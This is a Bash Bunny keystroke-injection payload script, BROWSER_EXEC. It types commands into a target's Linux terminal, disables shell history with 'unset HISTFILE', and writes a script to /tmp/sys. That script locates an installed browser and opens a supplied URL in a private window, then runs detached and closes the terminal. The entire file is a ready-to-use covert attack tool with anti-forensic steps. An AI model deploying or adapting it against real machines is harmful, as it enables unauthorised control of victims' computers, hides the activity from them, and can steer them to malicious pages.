#!/bin/bash

# BROWSER_EXEC v1 by @drapl0n
# BROWSER_EXEC finds browser installed in target's system and searche for URL in it.
# Usage: BROWSER_EXEC <URL>

function BROWSER_EXEC(){
	LED ATTACK
	Q DELAY 1000
	Q CTRL-ALT t
	Q DELAY 1000
	Q STRING unset HISTFILE
	Q ENTER
	Q DELAY 200
	Q STRING echo -e "\"#\!/bin/bash\nfunction browser(){\n\tbrowser=\\\$(ls /bin/ | grep -Ew 'firefox|chromium|brave'| head -1)\n\tif [ \\\"\\\$browser\\\" = firefox ]; then\n\t\texecBrowser=\\\$(echo \\\$browser --private-window)\n\t\texport execBrowser\n\telif [ \\\"\\\$browser\\\" = chromium ]; then\n\t\texecBrowser=\\\$(echo \\\$browser --incognito)\n\t\texport execBrowser\n\telif [ \\\"\\\$browser\\\" = brave ]; then\n\t\texecBrowser=\\\$(echo \\\$browser --incognito)\n\t\texport execBrowser\n\telse\n\t\techo \\\"Browser not found.\\\"\n\tfi\n}\nbrowser\n\\\$execBrowser $1 "\" \> /tmp/sys
	Q ENTER
	Q DELAY 200
	Q STRING chmod +x /tmp/sys
	Q ENTER
	Q DELAY 200
	Q STRING /tmp/./sys \& disown \&\& exit
	Q ENTER
} 
export -f BROWSER_EXEC $1
